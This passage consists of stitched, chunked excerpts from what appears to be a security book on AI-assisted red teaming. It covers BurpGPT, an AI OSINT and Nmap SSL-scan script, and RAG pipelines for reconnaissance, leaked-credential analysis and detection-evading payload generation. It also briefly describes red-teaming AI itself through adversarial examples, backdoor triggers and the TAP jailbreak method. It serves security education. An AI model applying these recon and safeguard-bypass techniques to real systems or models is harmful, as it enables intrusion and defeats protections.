will explore how red teaming is evolving to meet the complex, multifaceted
threats of tomorrow's technological world.
Understanding the Current State of AI in Red Teaming
The integration of AI into red teaming practices has ushered in a new era of
cybersecurity assessment, vulnerability discovery, exploitation, and post-

BurpGPT, which is a powerful tool designed to improve the precision and
efficiency of application security testing using Burp Suite. It uses advanced
language processing and an easy-to-use interface. This tool enables users to
perform complex tasks, such as evaluating cryptographic integrity and
detecting zero-day vulnerabilities, by leveraging large language models

prompts provided, allowing testers to use an AI Copilot for web traffic
analysis and web application assessment. BurpGPT can be downloaded
from burpgpt.app.
On one hand, traditional vulnerability scanners, while good for identifying
known security flaws, operate within the constraints of predefined rules and
signatures, often missing complex application logic flaws and novel attack
patterns. These tools excel at discovering common vulnerabilities but
frequently generate high volumes of false positives and struggle with
context-aware security issues.
On the other hand, AI-powered tools can revolutionize application security
testing by introducing intelligent, context-aware analysis capabilities. These
advanced tools leverage AI models to understand application behavior,
adapt to new attack patterns, and even suggest potential exploit paths—
capabilities far beyond traditional scanners. The integration of natural
language processing (NLP) allows you to interact with these tools more

Are You Leaking Sensitive Information in Your Red Team Engagement?
Knowing how AI-powered tools handle data is very important. Results from
red team or traditional penetration testing engagements are highly sensitive.
Some tools and their underlying AI models might use this data for training
purposes, which can expose confidential information. Ensuring this
sensitive data isn't used to train the model is essential because your
customers will certainly expect their information to remain secure and
private.
The BurpGPT Pro edition supports the use of local LLMs, which eliminate
the need for third-party data sharing and ensure confidentiality during client
engagements. It also provides access to prompt libraries and the ability to
support custom-trained models, allowing users to train models with their
own application security (otherwise known as “appsec”) data and tap into
internal knowledge bases.
Using AI, you can now
• Automate vulnerability scanning at unprecedented speeds and scales.

Creating AI-Powered Offensive Security Tools
There are many AI-powered offensive security tools that can help red
teamers automate and analyze the results of such tools. Let’s look closely at
Example 8-1. The script in Example 8-1 is an AI-powered open-source
intelligence (OSINT) analysis tool that I (Omar) created to perform
reconnaissance of a given domain. The script uses the tool certspy. Certspy
is another tool that I created to enumerate subdomains and hosts (even
internal hosts in an organization) using certificate transparency logs. The
code in Example 8-1 can be accessed at
https://github.com/santosomar/certspy_ai. The certspy tool can be installed
using pip3 install certspy, and the source core can be obtained from
https://github.com/santosomar/certspy.
What Is Certificate Transparency?
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p339_c304
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 339
# TOKENS: ~377
### CONTENT ###
Certificate transparency (CT) is an open framework aimed at improving the
safety of SSL/TLS certificates by creating an open and auditable log of all
certificates issued by certificate authorities. It allows for the detection of
mistakenly or maliciously issued certificates. In the context of
reconnaissance (recon), cybersecurity experts and ethical hackers can utilize
CT logs as a rich source of information for mapping the Internet landscape.
They can extract data about the existence of subdomains of a target domain,
revealing potential targets for further investigation or penetration testing.
This kind of intel can be vital in identifying vulnerable endpoints, tracking
the issuance of new certificates, and generally maintaining a strong security
posture against potential cyber threats. The tool crafted in the script
leverages CT logs accessible through the crt.sh platform to facilitate such
recon efforts, aiding in the timely identification of potential security
vulnerabilities.
The script in Example 8-1 uses LangChain, OpenAI models, and various
libraries for tasks like certificate information retrieval from certspy, DNS
resolution, and WHOIS lookup. It also loads environment variables and
initializes an OpenAI chat model. It performs DNS resolution of the
hostnames that were retrieved by certspy and retrieves WHOIS information
for each IP.
AI uses a GPT model to analyze the gathered information and provide
insights into the domain's security posture, potential sensitive hosts, and
### END CHUNK ###

 return org, cidr
 except Exception:
 return None, None

LangChain, Prompt Templates, LangSmith, LangGraph, and
LlamaIndex
LangChain, LangSmith, LangGraph, and LlamaIndex are powerful tools
and frameworks designed to enhance the development and deployment of
applications using large language models. Each of these tools serves a
unique purpose in the ecosystem of AI-driven applications.
LangChain
LangChain is an open-source framework that simplifies the creation of
applications powered by LLMs. It provides a comprehensive set of tools
and components that enable developers to build, customize, and deploy
applications that can interact with language models and external data
sources. LangChain's core features include the interaction with language
models to manage inputs and extract outputs. It allows the transformation
and retrieval of data through queries and chains of multiple prompts, tasks,
and other components to build complex AI-powered applications. It is used
to orchestrate actions by deciding the best steps to solve problems. It also
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p350_c315

# PAGE: 350
# TOKENS: ~354
### CONTENT ###
Prompt templates in LangChain are reusable structures that allow
developers to generate prompts with placeholders for dynamic content.
These templates help in creating consistent and precise queries for AI
models. LangChain provides functions like from_template() and
PromptTemplate() to create these templates, which can then be formatted
with specific inputs to generate desired outputs.
System prompts act as a framework that guides AI models in interpreting
and responding to user inputs. They are crucial for setting the stage for AI
interactions by establishing specific parameters within which the AI
operates. They do so by defining the goals, roles, and context for the AI,
which helps in tailoring responses to be more contextually appropriate and
engaging.
System prompts are great in guiding AI model behavior. They help
developers and researchers harness the capabilities of AI models, steering
them toward generating outputs that are not only accurate but also
contextually appropriate. By incorporating role-specific guidelines, tone
instructions, and creativity constraints, system prompts enable AI models to
exhibit more natural and coherent responses, mimicking human-like
interactions.
Additionally, system prompts enhance the overall performance and
efficiency of natural language processing systems. They help AI models
process complex queries, handle ambiguity, and generate responses that are
### END CHUNK ###

both accurate and relevant. Many individuals have used system prompts for
applications such as chatbots, virtual assistants, and content generation.
Best practices for crafting system prompts involve providing detailed
context, specifying desired formats, and setting clear goals to improve the
quality and relevance of AI responses. Effective prompt engineering can
lead to more precise answers, reduce errors, and enhance the user
experience by ensuring that AI outputs are aligned with user needs and
expectations.
Now let’s look at another example. Example 8-4 includes a script for
performing AI-powered SSL/TLS analysis on a given host or IP address. It
combines Nmap SSL cipher scan results and AI-powered analysis to
provide comprehensive insights about the host's SSL/TLS configuration.
The script reads the results.md file that was created by ai_recon_md.py and
extracts the hostnames from the file. It performs an Nmap SSL cipher scan
on the specified host or IP address. The scan results are then sent to an AI
model for analysis.
The AI-generated insights are saved to a file including the final output.

def run_nmap_scan(ip):
 """
 Runs an Nmap scan on the specified IP address.
 Args:
 ip (str): The IP address to scan.
 Returns:
 str: The scan results.
 """
 nm = nmap.PortScanner()
 nm.scan(ip, '443', arguments='--script ssl-enum-ci
 # Convert the scan results to a string
 scan_results = json.dumps(nm[ip], indent=2)
 return scan_results

LangSmith
LangSmith is a platform designed for building production-grade LLM
applications. It focuses on monitoring, evaluating, and optimizing language
model applications. LangSmith is particularly useful for transitioning from
prototyping to production, offering robust support for debugging and
evaluation.

LangGraph
LangGraph is a library for building stateful, multi-actor applications with
LLMs. LangGraph is ideal for applications requiring complex agentic
architectures and supports advanced features like streaming and human-in-
the-loop interactions.
Note
You can obtain an introduction to LangGraph from my
personal blog at https://becomingahacker.org/145f61f38747.
LangGraph builds upon the LangChain Expression Language, adding the
capability to coordinate multiple chains or actors across various
computation steps in a cyclic manner. According to the folks from
LangChain, it is inspired by frameworks such as Pregel and Apache Beam
to provide a flexible interface similar to NetworkX, which is particularly
adept at handling complex cycles rather than straightforward DAG-based
workflows.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p362_c327
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 362
# TOKENS: ~248
### CONTENT ###
LangGraph Cloud is an optional managed hosting service for LangGraph,
offering enhanced features specifically designed for production
deployments.
LlamaIndex
LlamaIndex, formerly known as GPT Index, is a data framework designed
to enhance LLM-based application development by integrating diverse data
sources. It can help you connect with various data sources and formats to
LLMs, and it provides efficient data retrieval and query capabilities.
LlamaIndex is basically the competitor of LangChain. It is also useful for
applications requiring retrieval-augmented generation (RAG) and can
handle both structured and unstructured data.
Note
You will learn more about RAG later in this chapter.
At the end of the day, LangChain, LangSmith, LangGraph, and LlamaIndex
collectively form a robust ecosystem for developing, deploying, and
managing applications that leverage the power of large language models.
Each tool offers capabilities that cater to different stages of the application
lifecycle.
### END CHUNK ###

Understanding Retrieval-Augmented Generation (RAG) for
Red Teaming
RAG techniques are revolutionizing how red teams approach information
gathering, exploitation, post-exploitation, and reporting. But what is RAG?
Retrieval-augmented generation is an AI/ML technique that helps enhance
the capabilities of generative AI models with external knowledge sourced
from a document collection. RAG acts as an AI framework aimed at
enhancing the quality of responses produced by language models (LLMs or
SLMs) by attaching the model to external knowledge bases, thus enriching
the model's inherent data representation.
Figure 8-2 shows a high-level RAG architecture deployment.
### END CHUNK ###

Figure 8-2 High-Level RAG Example
The following elements are illustrated in Figure 8-2:
• Document vectorization
• Vector database storage
• User query processing
• Semantic search and document retrieval
• Document ranking
• Context preparation for LLM or SLM
• Response generation and post-processing and refinement
In practical red team operations, RAG can be leveraged in several powerful
ways. For instance, during the initial reconnaissance phase, RAG systems
can automatically process and analyze target organizations' public
documentation, social media presence, and technical documentation to
identify potential attack vectors. The system can correlate this information
with known vulnerability databases and attack techniques, providing
contextualized recommendations for exploitation.
Another practical application involves using RAG to analyze gathered
credentials or leaked data dumps; the system can quickly identify patterns,

RAG can also assist in payload generation by analyzing target environment

combinations that are most likely to succeed while evading detection.
Vector Embeddings
In Figure 8-2, security-related documents (payloads,
OSINT/reconnaissance, and vulnerability data) are transformed into vector
representations, known as embeddings. This process captures the semantic
meaning of the text in a high-dimensional space. Many techniques can be
used. The following are a few examples:
• Traditional methods such as Term Frequency–Inverse Document
Frequency (TF-IDF) and principal component analysis (PCA). TF-IDF is
used to evaluate the importance of a word in a document relative to a
collection of documents (corpus). It’s commonly used in text mining and
information retrieval to improve the representation of text data. PCA is a
dimensionality reduction technique used to reduce the number of features in
a dataset while retaining as much variance (information) as possible. It
simplifies the dataset and helps in visualization and noise reduction.
• Neural network-based embedding models like Word2Vec and FastText.
Word2Vec is one of the first successful methods for learning word
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p370_c334
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 370
# TOKENS: ~308
### CONTENT ###
embeddings. It represents words as dense vectors in a continuous vector
space, where words with similar meanings are close to each other.
Word2Vec uses a shallow neural network model to learn word embeddings.
During training, the network adjusts the word vectors so that words
appearing in similar contexts are represented by similar vectors. Developed
by the Facebook Artificial Intelligence Research (FAIR) team, FastText is
an extension of Word2Vec that incorporates subword information into the
embeddings.
• Modern embedding models such as OpenAI’s embeddings and many
listed in the Massive Text Embedding Benchmark (MTEB) at
https://huggingface.co/spaces/mteb/leaderboard. Word2Vec and FastText
are static, context-independent embeddings. They are faster and simpler but
less flexible in handling context. OpenAI’s embeddings and several of those
in Hugging Face provide context-dependent embeddings generated by
advanced transformer models. They are more powerful and flexible than the
others just mentioned and are suited for complex tasks and nuanced
language understanding.
Tip
The choice of embedding technique depends on factors such
as computational resources, dataset size, privacy
considerations, and required accuracy.
### END CHUNK ###

Each word or piece of text is mapped to a vector in a continuous vector
space. The vector is a list of numerical values (floats) that represent the
word’s position in this space. The vector’s length, or dimensionality, is a
predefined parameter. Each dimension represents a latent feature or aspect
of the word's meaning. The values in the vector are learned from the data
and capture various aspects of the word's meaning and usage. For instance,
the values might encode semantic similarity, syntactic patterns, or
contextual usage.

Vector Database Storage
Going back to the RAG example in Figure 8-2, you can store the generated
embeddings in specialized vector databases optimized for high-dimensional
data, such as
• Chroma DB: An open-source embedded vector database
• FAISS (Facebook AI Similarity Search): An open-source library
developed by Facebook AI Research
• MongoDB Atlas Vector Search: A feature of the MongoDB Atlas
platform that enables users to perform semantic searches on vector
embeddings stored within the database
• Pinecone: A managed vector database service
• Weaviate: A vector database with GraphQL support
• Milvus: Another open-source vector database designed to handle large-
scale vector data
These databases are designed to efficiently store, index, and retrieve vector
representations, enabling fast similarity searches. You can use the script
shown in Example 8-11 to create a vector database using Chroma DB.

Vector Databases and Encryption
Some vector databases do not support encryption. As you learned earlier,
vector embeddings are mathematical representations of data and are often
used for similarity searches. Traditional encryption methods can disrupt the
mathematical properties of vectors, making it difficult to perform operations
like nearest neighbor searches directly on encrypted data. There also are
more advanced encryption techniques, such as queryable/searchable
encryption and homomorphic encryption. You can learn more about how to
secure vector databases at
https://sec.cloudapps.cisco.com/security/center/resources/securing-vector-
databases.

prompt or question to the system. It could be a query about server-side
request forgery (SSRF) vulnerabilities, potential attack vectors, or strategies
for exploiting a target system.
The user’s query is also converted into a vector representation (embedding).
You can even use the same embedding model as used for document

The system processes the prompt or question and performs a semantic

Semantic Search and Document Retrieval
Semantic search is an information retrieval technique that focuses on
understanding the meaning and context of a search query rather than just
matching keywords. Unlike traditional keyword-based search, which looks
for exact matches of words in documents, semantic search aims to
understand the intent behind the query and find documents that are relevant
to that intent, even if they don’t contain the exact search terms.
The core of semantic search involves converting both the query and the
documents into dense vector embeddings. Once both the query and
documents are embedded, semantic search measures the similarity between
these vectors. Techniques like cosine similarity or dot product are often
used to find the closest matches in the vector space. Because semantic
search understands the context, it can return relevant results even if the
exact terms aren't used. For example, a search for "best ways to create an
exploit for SSRF vulnerabilities" might return information in the ssrf.txt
document because the system understands the similarity in meaning.
Importance of Good Indexing
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p380_c344
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 380
# TOKENS: ~348
### CONTENT ###
Indexing is the process of organizing data to make retrieval efficient and
effective. In the context of semantic search, good indexing is critical for
several reasons. Good indexing structures the data in a way that allows the
search engine to quickly access relevant documents. Without efficient
indexing, searches would require scanning through all documents, which is
computationally expensive and slow. As the volume of data grows, good
indexing ensures that the search system can scale to handle large datasets
without a significant drop in performance. Efficient indexing algorithms
and data structures (like inverted indexes, B-trees, or KD-trees for vector
data) are essential to maintain performance. Effective indexing ensures that
the most relevant documents are retrieved. Indexing strategies that consider
both the content and context (using embeddings) help in surfacing the most
meaningful results. In semantic search, embeddings are often high-
dimensional vectors. Good indexing techniques, such as Approximate
Nearest Neighbor (ANN) methods, are needed to efficiently search in high-
dimensional spaces and retrieve the most semantically similar documents.
Hybrid Search Retrieval
You can combine semantic search with traditional keyword-based methods
for improved results. The Best Match 25 (BM25) algorithm is often used
alongside vector similarity for a balanced approach.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p381_c345
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 381
# TOKENS: ~306
### CONTENT ###
BM25 is a ranking algorithm used in information retrieval systems to
estimate the relevance of documents based on a search query. It is an
extension of the Term Frequency–Inverse Document Frequency (TF-IDF)
model. BM25 calculates a relevance score for each document.
In RAG implementations, hybrid search combines traditional keyword-
based search (like BM25) with semantic search methods that use dense
vector embeddings. This combination leverages both exact keyword
matching and contextual understanding of queries.
Hybrid search merges two concepts: BM25 for keyword search and dense
vector search for semantic understanding.
BM25 retrieves documents based on exact keyword matches and ranks
them according to their relevance scores. This method excels at identifying
documents that contain specific terms from the query. Dense vectors
capture the semantic meaning of words and phrases. This allows for
retrieving documents that may not contain exact keyword matches but are
contextually relevant.
Note
When BM25's keyword matching is combined with vector-
based semantic search, hybrid search can retrieve more
contextually appropriate results, especially for complex
queries. Hybrid search can handle both simple queries
### END CHUNK ###

(where exact matches are important) and complex queries

documents that are then used by LLMs to generate
responses. This approach reduces the risk of hallucinations
by grounding LLM outputs in real data. In practice, a hybrid
search can be implemented by first running a BM25-based
search to retrieve top candidate documents based on
keywords. Then a second pass using dense vector similarity
can rerank or filter these results based on semantic
relevance. Some systems also use a weighted combination of
both methods to balance keyword importance against
semantic similarity.

capabilities in RAG. LlamaIndex implements hybrid search by integrating
both keyword-based methods, such as BM25, and vector-based search
techniques. This approach allows for a balanced retrieval system that can
handle various types of queries effectively.

Document Ranking
Document ranking is an important step in RAG systems that determines the
order and relevance of retrieved documents. This process ensures that the
most pertinent information is prioritized for use in generating responses. A
key piece of document ranking is relevance scoring measuring the closeness
between query and document embeddings.
You can use traditional BM25 (a probabilistic ranking function that
balances term frequency and document length) or other popular gradient
boosting methods such as Multiple Additive Regression Trees (MART) and
LambdaRank. LambdaRank is an algorithm that optimizes ranking metrics
by computing gradients (called lambdas) that are used to adjust the rank of
items based on their relative position.
You can also use the conversation history or user context in ranking
decisions. This can be done by adapting rankings based on user preferences
or previous interactions.
Note
### END CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p384_c348
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 384
# TOKENS: ~346
### CONTENT ###
Maximal Marginal Relevance (MMR) balances relevance
and diversity by iteratively selecting items that are both
highly relevant to a query and sufficiently different from
items already selected. This is done so that the output is not
only aligned with the user's intent but also avoids
redundancy, leading to a more diverse and informative result
set. MMR prioritizes items that are closely related to the
user's query or goal. During each iteration, it evaluates the
relevance of each candidate item to the query, often using a
similarity metric like cosine similarity in a vector space
model. This ensures that the selected items are pertinent and
address the core needs of the query.
To avoid redundancy, MMR also considers the similarity
between a candidate item and the items already selected. It
penalizes items that are too similar to those already in the
result set. This is good for producing a diverse set of results
that provide unique perspectives or information, rather than
reiterating the same content. In applications like search
engines, recommender systems, or summarization, users
benefit from seeing varied yet relevant results. For instance,
let's say you want to summarize cybersecurity specific
documentation, MMR will help the system's summary to
cover diverse elements of the content rather than focusing
repeatedly on a single topic. In search results, it avoids
### END CHUNK ###

the user experience.
RAG Fusion and RAPTOR
There are several advanced techniques for RAG implementations. They
include RAG-Fusion and RAPTOR. RAG-Fusion builds on the traditional
RAG approach by incorporating Reciprocal Rank Fusion (RRF). This
method generates multiple queries based on the original user query,
retrieves documents for each query, and then uses RRF to rerank and fuse
these documents into a comprehensive response.
RAPTOR introduces a new approach by constructing a hierarchical tree
structure through recursive clustering and summarization of text chunks.
RAPTOR embeds, clusters, and summarizes chunks of text to create a tree
that represents different levels of abstraction.
Tip
You can learn more about RAG-Fusion and RAPTOR at
https://becomingahacker.org/1aa76fce6a5c. This article includes references
to hands-on tutorials and sample code.
### END CHUNK ###

### CONTENT ###
Context Preparation for LLMs or SLMs
Context preparation is another step in RAG systems. This process involves
choosing the most relevant portions of retrieved documents and balancing
between coverage and conciseness to fit within model context limits. You
can use context truncation and summarization. This could be done by
truncating lengthy documents to fit within model token limits or generating
abstractive or extractive summaries of longer texts, as illustrated in Figure
8-5.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p388_c351
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 388
# TOKENS: ~59
### CONTENT ###
You can also perform context preparation by doing information density
optimization. This process involves prioritizing sentences or passages with
high information content or removing redundant or less relevant
information (see Figure 8-6).
### END CHUNK ###

### BEGIN CHUNK ###

# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p390_c353

# PAGE: 390
# TOKENS: ~296
### CONTENT ###
Other methods of context preparation include context ordering by placing
the most relevant information closer to the query in the input sequence.
Additionally, you could add source information, timestamps, or confidence
scores to the context.
Note
Regardless of the context preparation technique, you should
always craft effective prompts (human and system prompts)
that guide the LLM in using the provided context.
Response Generation and Post-Processing and Refinement
Response generation, post-processing, and refinement are the final stages in
the RAG pipeline, where the system produces and refines the output based
on the retrieved context and user query. This process involves the actual
model response generation sending the constructed context and prompt to
the LLM or SLM for processing. You could also use source attribution by
adding citations or references to original sources (from the retrieved
documents) used in the response and indicating which parts of the response
are based on retrieved information versus model knowledge.
Additionally, you can incorporate “human-in-the-loop” by allowing human
review and editing of generated responses when necessary. Example 8-12
### END CHUNK ###

Red Teaming AI and Autonomous Systems
Red teaming in the context of testing AI involves simulating attack
scenarios to identify vulnerabilities and improve the security and
functionality of AI systems. This approach is often referred to as
algorithmic red teaming. I often joke that asking 10 people what “red
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p395_c358
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 395
# TOKENS: ~361
### CONTENT ###
teaming AI” means will get you 50 different answers. While some might
describe it as testing AI applications and models through prompt injection
attacks to assess security posture, others focus on evaluating biases, ethics,
and discrimination. Each perspective holds validity. However, in this
discussion, I will specifically concentrate on the security aspects of red
teaming AI.
There is no universally accepted standard for AI red teaming, leading to
inconsistencies in how vulnerabilities are assessed and addressed. This lack
of standardization makes it challenging to objectively compare the safety of
different AI systems. AI models, especially LLMs, are complex and can be
difficult to test comprehensively. They are susceptible to various
vulnerabilities, such as adversarial attacks and data poisoning, which
require sophisticated testing strategies.
AI red teams must develop techniques to generate adversarial examples that
can fool the model without being easily detected by traditional validation
methods. Most of AI “algorithmic red teaming” is performed by using
automated tools.
Different models may have different vulnerabilities, requiring red teams to
tailor their attack strategies depending on the architecture (such as
convolutional neural networks versus transformers). Many models
incorporate defenses like adversarial training or input pre-processing,
making it more challenging for red teams to bypass these protections.
### END CHUNK ###

### BEGIN CHUNK ###
# ID: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077_p396_c359
# SOURCE: Redefining Hacking_ A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven W...Omar Santos_ Savannah Lazzara_ Barrett Darnell_ Wesley Turner(2025, Addison-Wesley Professional)1077
# PAGE: 396
# TOKENS: ~345
### CONTENT ###
Methods like the Fast Gradient Sign Method (FGSM) or Projected Gradient
Descent (PGD) are commonly used to generate adversarial examples by
directly manipulating the model’s gradients. In cases where the model’s
internal structure is unknown, red teams might employ black-box attacks,
using techniques like query-based or transfer-based attacks to craft
adversarial inputs.
Red teams might simulate backdoor attacks where a model behaves
normally except when a specific trigger is present in the input. As a result,
attackers can manipulate outputs for certain conditions while maintaining
overall performance.
Challenges in Red Teaming AI Systems
Anthropic explains some of the challenges in red teaming AI systems in an
article available at https://www.anthropic.com/news/challenges-in-red-
teaming-ai-systems. This article outlines several red teaming methods, each
with its own advantages and challenges. First, it explains the importance of
domain-specific expert red teaming by collaborating with subject matter
experts to identify risks in specific areas like trust and safety and even
national security. This includes Policy Vulnerability Testing (PVT) for trust
and safety risks and frontier threats red teaming for national security risks.
Most of the red teaming of AI systems has been done in English.
Addressing representation issues by testing AI systems in different
### END CHUNK ###

### CONTENT ###
languages and cultural contexts is important to better understand and
mitigate potential biases.
You should leverage AI to automatically generate adversarial examples,
complementing manual testing efforts. Doing so includes automated red
teaming to improve model robustness against harmful behavior.
You should also test AI systems that process various forms of input, such as
images or audio, to identify novel risks before deployment.
You should red team not only the AI models but also their underlying data
infrastructure and interconnected tools to ensure all potential vulnerabilities
are addressed. AI red teaming should be part of an ongoing effort to monitor
and improve AI systems, adapting to new threats as they emerge.
Tree of Attacks with Pruning (TAP)
AI security researchers from Robust Intelligence (a company acquired by
Cisco in 2024), in partnership with Yale University, created an automated
adversarial machine learning technique that effectively bypasses the
safeguards of advanced models. This technique is called the Tree of Attacks
with Pruning (TAP) and uses two large language models to generate and
iteratively refine malicious prompts. The Attacker LLM is responsible for
### END CHUNK ###

Keeping Pace with Rapidly Evolving Technologies
Red teamers and ethical hackers face the ongoing challenge of staying
ahead of rapidly evolving technologies. At the end of the day, everyone is
facing the same challenge nowadays. AI has introduced both new
opportunities and new threats. Cybersecurity professionals must adapt and
evolve their skills continuously.
What about certifications? Certifications and training will face a significant
challenge due to the rapid pace of technological advancements and the
accelerating development of AI and technology. As technologies evolve and
new tools and methodologies emerge, maintaining the relevance and
effectiveness of certification programs and training materials becomes
increasingly difficult. You should participate in industry conferences,
workshops, and seminars such as DEF CON, BSides, and others. They

often feature sessions on the latest technological advancements and their

Keeping abreast of the latest trends and developments in technology is
important for maintaining relevance. Online resources such as the Hacker
News provide timely updates on new threats and even AI news. You can
also subscribe to newsletters and academic journals that cover emerging
technologies and their impact on cybersecurity. Researchers are publishing
new research and discoveries on a daily basis at sites like arxiv.org. You can
